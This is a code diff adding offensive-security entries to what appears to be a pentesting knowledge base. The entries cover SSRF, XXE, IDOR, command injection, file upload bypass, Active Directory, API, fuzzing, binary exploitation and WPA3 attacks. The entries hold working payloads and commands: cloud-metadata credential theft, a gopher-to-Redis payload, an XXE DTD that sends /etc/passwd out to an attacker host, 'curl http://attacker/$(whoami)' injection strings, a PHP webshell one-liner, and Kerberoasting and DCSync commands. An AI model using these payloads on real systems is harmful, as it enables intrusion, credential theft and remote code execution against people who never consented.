@@ -1133,6 +1133,376 @@ Use JARVIS to automate: /api/targets?skill=beginner`,
     ],
     relatedTools: ['subfinder', 'amass', 'httpx', 'nuclei', 'waybackurls', 'gau'],
   },
+  // ── WEB EXPLOITATION DEEP CUTS ──
+  {
+    id: 'ssrf',
+    title: 'SSRF — Server-Side Request Forgery',
+    category: 'web-security',
+    content: `SSRF tricks a server into making requests the attacker chooses — often to internal services the attacker cannot reach directly.
+
+High-value targets from a SSRF foothold:
+- Cloud metadata: http://169.254.169.254 (AWS IMDSv1 leaks role credentials), Azure 169.254.169.254/metadata/identity, GCP metadata.google.internal
+- Internal admin panels, databases, Redis (gopher://), Elasticsearch (9200)
+- Kubernetes API (https://kubernetes.default.svc) and kubelet (10250)
+
+Filter bypass techniques:
+- DNS rebinding: domain resolves internal then external (or use rbndr.us)
+- Redirect chains: external 302 → internal target
+- URL parsing quirks: http://1.1.1.1@evil.com vs http://evil.com@1.1.1.1, decimal/octal/hex IP encodings, 0.0.0.0, [::] , 0177.0.0.1
+- Scheme abuse: gopher:// for arbitrary TCP (Redis/SMTP exploitation), file:// for local read
+- DNS pinning failures when the app resolves then fetches by IP
+
+Blind SSRF: rely on out-of-band callbacks (webhook.site, Burp Collaborator) to confirm.
+
+Chain to impact: leaked cloud credentials → full cloud account takeover; internal service RCE via gopher+Redis.`,
+    tags: ['ssrf', 'server-side', 'request', 'forgery', 'metadata', 'imds', 'internal', 'cloud', 'gopher'],
+    commands: [
+      'curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
+      'curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"',
+      'ffuf -u TARGET/?url=FUZZ -w ssrf-hosts.txt',
+      'interactsh-client',
+    ],
+    examples: [
+      'AWS credential theft: SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/ → use keys with aws configure',
+      'Redis RCE via gopher: gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...',
+      'Blind detection: url=http://webhook.site/UUID and watch for the callback',
+    ],
+    relatedTools: ['burp-suite', 'collaborator', 'interactsh', 'ffuf'],
+  },
+  {
+    id: 'xxe',
+    title: 'XXE — XML External Entity Injection',
+    category: 'web-security',
+    content: `XXE exploits XML parsers that resolve external entities. When user-controlled XML is parsed, entities can read local files, SSRF internally, or exfiltrate data.
+
+Classic file read:
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+
+Blind exfiltration via parameter entities + external DTD:
+<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker/evil.dtd"> %remote;]>
+evil.dtd: <!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % s SYSTEM "http://attacker/?d=%f;"> %s;
+
+Variants:
+- OOB via FTP for multi-line files (http breaks on newlines)
+- XInclude: <xi:include href="file:///etc/passwd" parse="text"/> when DOCTYPE is stripped
+- SOAP, SVG uploads, Office documents (docx/xlsx are ZIPs of XML), SAML
+- PHP expect:// module for command execution
+- DoS via billion laughs entity expansion
+
+Modern Java parsers: disable DTDs. If you find XML anywhere (upload, API, SSO), always test.`,
+    tags: ['xxe', 'xml', 'entity', 'external', 'dtd', 'oob', 'exfiltration', 'saml', 'docx'],
+    commands: [
+      'curl -X POST TARGET/api/xml -H "Content-Type: application/xml" --data-binary @payload.xml',
+      'python3 -m http.server 80  # serve evil.dtd for OOB',
+    ],
+    examples: [
+      'File read via entity: <!ENTITY xxe SYSTEM "file:///etc/passwd"> then &xxe; in body',
+      'Blind OOB: parameter entity pulls attacker DTD, which exfiltrates via HTTP',
+      'docx payload: inject XXE into word/document.xml, rezip, upload',
+    ],
+    relatedTools: ['burp-suite', 'xxeinjector'],
+  },
+  {
+    id: 'idor',
+    title: 'IDOR — Insecure Direct Object References',
+    category: 'web-security',
+    content: `IDOR: the server trusts a client-supplied identifier without checking ownership. Change the ID, access someone else\u2019s data — the classic broken access control bug.
+
+Where to hunt:
+- Sequential IDs: /api/invoices/1024 → 1025
+- UUIDs leaked elsewhere (email headers, other endpoints, exports)
+- Encoded IDs: base64, JWT claims, hex — decode, modify, re-encode
+- Hashed IDs: often unsalted MD5 of the numeric ID — hash-invert and collide
+- IDs in mass-assignment params: PATCH {"user_id": 42}
+
+Methodology:
+1. Create two accounts (A and B)
+2. Capture every request with object references while acting as A
+3. Replay with B\u2019s session but A\u2019s identifiers — and vice versa
+4. Also test privilege directions: admin-only actions as regular user
+5. Check GraphQL resolvers, mobile API endpoints (often less protected than web), and export/download features
+
+Impact framing for reports: data exfiltration across tenants, PII exposure, unauthorized modification. Show two-account proof — this is what makes the report undeniable.`,
+    tags: ['idor', 'access', 'control', 'authorization', 'bypass', 'object', 'reference', 'bola', 'api'],
+    commands: [
+      'ffuf -u TARGET/api/invoices/FUZZ -H "Authorization: Bearer B_TOKEN" -w ids.txt -mc 200',
+      'echo "NDI=" | base64 -d  # 42',
+    ],
+    examples: [
+      'Two-account test: login as B, request /api/users/1 (A\u2019s id) → 200 with A\u2019s data = IDOR',
+      'GraphQL: query otherUserId objects via getUser(id:42) even though UI never links there',
+    ],
+    relatedTools: ['burp-suite', 'autorize', 'ffuf'],
+  },
+  {
+    id: 'command-injection',
+    title: 'OS Command Injection',
+    category: 'web-security',
+    content: `Command injection occurs when user input reaches a shell (system(), exec(), popen, backticks) without isolation.
+
+Detection payloads (time-based is most reliable):
+- ; sleep 10  |  && sleep 10  |  | sleep 10  |  $(sleep 10)  |  \`sleep 10\`
+- Newline: %0asleep%2010
+- Windows: & timeout 10 &  |  | ping -n 10 127.0.0.1
+
+Blind exfiltration:
+- ; curl http://attacker/$(whoami)
+- DNS: $(whoami).attacker.oast.fun via nslookup
+
+Filter bypasses:
+- Spaces: \${IFS} , \$IFS\$9 , < , {cat,/etc/passwd}
+- Blacklisted chars: \x2f (/), use $HOME, or cd etc;cat passwd
+- Quotes stripped: a\'b\'c → abc trick
+- Literal blocked (cat, ls): ca\t , l\s , use tac , xxd , head , base64
+
+Exploit chain value: RCE → reverse shell → pivot. If you get output reflection, you don\u2019t even need OOB.
+
+Defensive note for hardening tasks: prefer execFile/argv arrays, never interpolate into a shell string.`,
+    tags: ['command', 'injection', 'rce', 'shell', 'execution', 'oast', 'blind', 'bash'],
+    commands: [
+      'curl "TARGET/ping?host=127.0.0.1;id"',
+      'curl "TARGET/ping?host=%60curl%20http://oast/%24(whoami)%60"',
+    ],
+    examples: [
+      'Time-based: host=;sleep 10 → response delayed = injectable',
+      'Space-less: host=;cat${IFS}/etc/passwd',
+      'Windows: host=&whoami',
+    ],
+    relatedTools: ['burp-suite', 'commix', 'interactsh'],
+  },
+  {
+    id: 'file-upload-exploitation',
+    title: 'File Upload Exploitation',
+    category: 'web-security',
+    content: `File uploads are a path to RCE when the server serves or processes what you upload.
+
+Bypass matrix:
+- Extension filters: shell.php → .php5 .phtml .phar .pht ; shell.jpg.php ; shell.php%00.jpg (null byte, old stacks) ; trailing dot shell.php. ; .PhP case ; shell.jpg/.php (path traversal in filename)
+- Content-Type tricks: send image/jpeg with PHP inside
+- Magic bytes: GIF89a header + PHP code → passes file(1) checks
+- Double extension with misconfigured nginx: shell.png → served as PHP via /uploads/shell.png/x.php pattern
+- .htaccess upload: AddType application/x-httpd-php .jpg → every jpg executes
+- SVG with embedded JS for stored XSS when served inline
+- ZIP bombs and polyglots (file that is both image and archive)
+
+Where code executes: web roots, avatar processors (ImageMagick CVE-2016-3714 ImageTragick), PDF converters, antivirus sandboxes, deserialization after upload.
+
+Enumeration first: find where uploads land (response paths, guessable dirs), whether execution is on, and what processors run.`,
+    tags: ['upload', 'file', 'rce', 'bypass', 'extension', 'polyglot', 'htaccess', 'svg', 'webshell'],
+    commands: [
+      'curl -F "file=@shell.php;type=image/jpeg" TARGET/upload',
+      'printf "GIF89a<?php system($_GET[0]); ?>" > shell.gif',
+      'exiftool "-Comment<=payload.php" image.jpg',
+    ],
+    examples: [
+      'PHP filter bypass: rename to shell.phtml or add GIF89a magic bytes',
+      'nginx misconfig: upload shell.png then request /uploads/shell.png/x.php',
+      'ImageTragick: crafted MVG file → command execution in convert pipeline',
+    ],
+    relatedTools: ['burp-suite', 'exiftool', 'fuximizer'],
+  },
+  // ── ENTERPRISE / AD ──
+  {
+    id: 'active-directory',
+    title: 'Active Directory Attack Methodology',
+    category: 'exploitation',
+    content: `AD attacks follow a kill chain: recon → credential access → escalation → domain dominance.
+
+Recon without credentials:
+- LDAP null bind, DNS zone transfer, RPC endpoint mapper (rpcdump)
+- SMB null sessions: enum4linux, crackmapexec --gen-relay-list
+
+Credential access:
+- AS-REP Roasting: users with "do not require preauth" (GetNPUsers.py)
+- Kerberoasting: request SPN tickets, crack offline (GetUserSPNs.py + hashcat -m 13100)
+- LLMNR/NBT-NS poisoning: responder → capture NTLMv2 → hashcat -m 5600
+- Password spray: one password across many users (sprayhound, kerbrute) — avoid lockouts
+
+Escalation paths:
+- Kerberoast service accounts with domain-admin rights
+- Constrained/unconstrained delegation abuse (Rubeus)
+- GPP cpassword in SYSVOL (gpp-decrypt)
+- ACL abuse: GenericAll, WriteDacl, ForceChangePassword (BloodHound finds these)
+- PrintNightmare, noPac, PetitPotam → NTLM relay to ADCS
+
+Domain dominance:
+- DCSync: secretsdump.py -just-dc
+- Golden ticket (krbtgt hash), silver ticket (SPN hash)
+- NTDS.dit extraction via volume shadow copy
+
+Tools: BloodHound (path mapping), crackmapexec, impacket suite, Rubeus, certipy for ADCS misconfigurations (ESC1-8).`,
+    tags: ['active', 'directory', 'ad', 'kerberos', 'kerberoast', 'bloodhound', 'impacket', 'dcsync', 'golden', 'ticket', 'adcs'],
+    commands: [
+      'bloodhound-python -d domain.local -u user -p pass -c All',
+      'GetNPUsers.py domain.local/ -usersfile users.txt -no-pass',
+      'GetUserSPNs.py domain.local/user:pass -request',
+      'hashcat -m 13100 spn.txt rockyou.txt',
+      'secretsdump.py domain.local/admin:pass@dc.domain.local',
+      'certipy find -u user@domain.local -p pass -dc-ip DC_IP',
+    ],
+    examples: [
+      'Kerberoast chain: GetUserSPNs → hashcat 13100 → service account = DA',
+      'DCSync: secretsdump.py -just-dc-ntlm → extract krbtgt → golden ticket',
+      'ADCS ESC1: certipy find shows templates allowing SAN → request cert as DA',
+    ],
+    relatedTools: ['bloodhound', 'impacket', 'crackmapexec', 'responder', 'rubeus', 'certipy'],
+  },
+  // ── API SECURITY ──
+  {
+    id: 'api-security-testing',
+    title: 'API Security Testing (REST & GraphQL)',
+    category: 'web-security',
+    content: `APIs fail in ways the UI never shows — test the contract, not the pages.
+
+REST methodology (OWASP API Top 10):
+- BOLA/IDOR on every object reference (see IDOR entry)
+- Mass assignment: add {"role":"admin","price":0} to POST/PATCH bodies
+- Excessive data exposure: compare API response fields to UI usage — emails, tokens, internal flags
+- Rate-limit testing: resource consumption (BRLA) — pagination without caps, expensive queries
+- Auth issues: missing auth on /v2 endpoints while /v1 is protected; JWT alg=none, kid injection, weak secrets
+- Hidden endpoints: JS file mining, wayback, API docs (/swagger, /openapi.json, /graphql, /api-docs)
+
+GraphQL specifics:
+- Introspection: {__schema{types{name}}} — if disabled, try field suggestions (autocomplete error oracle)
+- Batching abuse: alias 100 queries in one request to bypass rate limits
+- N+1 deep queries: {user{friends{friends{friends...}}}} DoS
+- Mutation abuse: call admin mutations as normal user
+- GET-queryable GraphQL → SSRF/CSRF surface
+
+Tooling: mitmproxy/Burp for capture, Arjun for hidden parameter discovery, Kiterunner for endpoint brute force, graphql-cop/graphw00f for GraphQL recon.`,
+    tags: ['api', 'rest', 'graphql', 'bola', 'jwt', 'mass', 'assignment', 'introspection', 'swagger', 'openapi'],
+    commands: [
+      'arjun -u TARGET/api -m GET',
+      'kr scan TARGET -w routes.kite',
+      'curl TARGET/graphql -H "Content-Type: application/json" -d \'{"query":"{__schema{types{name}}}"}\'',
+      'graphw00f -u TARGET/graphql',
+    ],
+    examples: [
+      'Mass assignment: PATCH /api/profile {"is_admin":true} → escalated',
+      'JWT bypass: change alg to none, or reuse unsigned token',
+      'GraphQL batching: [{},{},{},...] aliases to defeat rate limiting',
+    ],
+    relatedTools: ['burp-suite', 'arjun', 'kiterunner', 'graphql-cop', 'mitmproxy'],
+  },
+  // ── FUZZING & BINARY ──
+  {
+    id: 'fuzzing-methodology',
+    title: 'Fuzzing Methodology — File, Network, and Web',
+    category: 'exploitation',
+    content: `Fuzzing finds bugs no pattern matches: malformed input that crashes or corrupts parsers.
+
+File-format fuzzing:
+- AFL++: American Fuzzy Lop with persistent mode — instrument targets with afl-gcc / afl-clang-fast
+- libFuzzer: in-process, structure-aware via LLVMFuzzerTestOneInput
+- honggfuzz, OSS-Fuzz for large projects
+- Seed corpus: real samples mutated; use dictionaries (-x) for format keywords
+
+Network/protocol fuzzing:
+- boofuzz (Sulley successor): block-based protocol models, monitor resets
+- Mutiny, SPIKE for pcap-guided replay mutation
+
+Web fuzzing:
+- ffuf/feroxbuster for content discovery
+- Parameter fuzzing: Arjun, param-miner (Burp)
+- Header fuzzing: X-Forwarded-For bypasses, request smuggling (CL.TE / TE.CL with smugler)
+
+Methodology:
+1. Identify attack surface: parsers, converters, deserializers
+2. Build corpus from real files + corner cases (deep nesting, huge fields, signedness edges)
+3. Run with crash deduplication; triage with gdb/ASAN
+4. Minimize testcases (afl-tmin, libFuzzer -minimize_crash)
+5. Classify: memory corruption (ASAN), logic bug, DoS
+
+Coverage feedback is the whole game — guided fuzzing beats blind loops by orders of magnitude.`,
+    tags: ['fuzzing', 'afl', 'libfuzzer', 'boofuzz', 'crash', 'corpus', 'asan', 'smuggling', 'protocol'],
+    commands: [
+      'afl-fuzz -i corpus -o out -x dict.txt -- ./target @@',
+      'afl-tmin -i crash-0 -o minimized -- ./target @@',
+      'ffuf -u TARGET/FUZZ -w wordlist.txt -mc all -ac',
+      'boofuzz --target TARGET:PORT --protocol tcp',
+    ],
+    examples: [
+      'ASAN build: export CFLAGS="-fsanitize=address" before compiling for real crash reports',
+      'Request smuggling: send CL.TE desync pair, check for poisoned socket',
+    ],
+    relatedTools: ['afl', 'libfuzzer', 'boofuzz', 'ffuf', 'gdb'],
+  },
+  {
+    id: 'binary-exploitation',
+    title: 'Binary Exploitation — Stack, Heap, and ROP',
+    category: 'reverse-engineering',
+    content: `Binary exploitation turns memory corruption into controlled execution.
+
+Stack:
+- Classic overflow → saved RIP overwrite; canary present → leak via format string or info bug
+- ret2libc when NX: payload = padding + pop rdi gadget + /bin/sh addr + system()
+- ROP chains with ROPgadget/ropper; SROP when few gadgets
+- format string: %n write primitives, %p leaks (printf(buf) — not printf("%s", buf))
+
+Heap:
+- glibc tcache poisoning (size classes, double free, UAF)
+- House of Force / House of Botcake techniques per malloc version
+- Check mitigations first: checksec --file=binary (RELRO, PIE, NX, canary)
+
+Process:
+1. checksec → know your constraints
+2. Reverse the parser (Ghidra) to find the overflow point
+3. Compute offsets (cyclic pattern + $rsp)
+4. pwntools for the loop: p64(), sendline, interactive
+5. Debug locally with gdb-pwndbg, then port to remote (offsets may shift with libc — use libc-database)
+
+Modern CTFs and real targets use ROP + libc leaks because stack exec is dead everywhere.`,
+    tags: ['binary', 'exploitation', 'rop', 'pwn', 'stack', 'heap', 'overflow', 'pwntools', 'gdb', 'libc'],
+    commands: [
+      'checksec --file=./binary',
+      'python3 -c \'from pwn import *; print(cyclic(200))\'',
+      'ROPgadget --binary ./binary | grep "pop rdi"',
+      'one_gadget ./libc.so.6',
+      'gdb ./binary -ex \'cyclic pattern\' -ex run',
+    ],
+    examples: [
+      'ret2libc: p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system) after overflow',
+      'Format string leak: AAAA%p%p%p%p to map the stack, then %k$n write',
+      'Offset finding: cyclic(200) crash → $rsp value → cyclic_find() → exact offset',
+    ],
+    relatedTools: ['pwntools', 'gdb', 'ghidra', 'ropgadget', 'one_gadget'],
+  },
+  {
+    id: 'wpa3-and-modern-wireless',
+    title: 'WPA3, SAE, and Modern Wireless Attacks',
+    category: 'wireless',
+    content: `WPA3 changes the wireless game — the old 4-way handshake crack path is mostly closed, so attack the protocol edges instead.
+
+WPA3/SAE reality:
+- Dragonfly handshake resists offline dictionary attacks — aircrack-ng style cracking no longer works directly
+- Timing/cache side-channel leaks (Dragonblood CVE-2019-13377) on early implementations
+- Transition mode (WPA2+WPA3 mixed): clients still do WPA2 — downgrade opportunities exist by deauthing and letting them reconnect in WPA2 mode
+- SAE commit flooding / DoS is trivial in practice
+
+Enterprise wireless:
+- WPA2-Enterprise: evil twin with hostapd-wpe captures MSCHAPv2 → asleap crack
+- PEAP/EAP-TTLS inner identity leakage
+- 802.1X rogue wired: hub on a meeting-room port, capture EAP exchange
+
+Other vectors:
+- PMF (802.11w) protected management frames block classic deauth on WPA3-only networks — check if PMF is actually required vs capable
+- Bluetooth/BLE: GATT enumeration, relay attacks with btbb/BTLEJuice
+- SDR layer: ADS-B, keyless entry rolling codes (rtl_433)
+
+Hardware: Atheros chipsets for monitor+inject; ESP32 Marauder for portable recon.`,
+    tags: ['wpa3', 'sae', 'dragonfly', 'dragonblood', 'transition', 'enterprise', 'eap', 'pmf', '802.11w', 'bluetooth'],
+    commands: [
+      'airodump-ng wlan0mon  # identify WPA3/WPA2 transition (opmode column)',
+      'hostapd-wpe hostapd-wpe.conf',
+      'asleap -C challenge -R response -W wordlist',
+      'hcxpcapngtool capture.pcapng -o hash.hc22000 && hashcat -m 22000 hash.hc22000 rockyou.txt',
+    ],
+    examples: [
+      'Transition downgrade: deauth client on WPA2/WPA3 mixed → it reconnects WPA2 → capture SAE-fallback handshake',
+      'Enterprise: hostapd-wpe evil twin → MSCHAPv2 hash → asleap → password',
+    ],
+    relatedTools: ['aircrack-ng', 'hcxtools', 'hostapd-wpe', 'marauder', 'rtl_433'],
+  },
 ];
 
 // ═══════════════════════════════════════════════════════════════
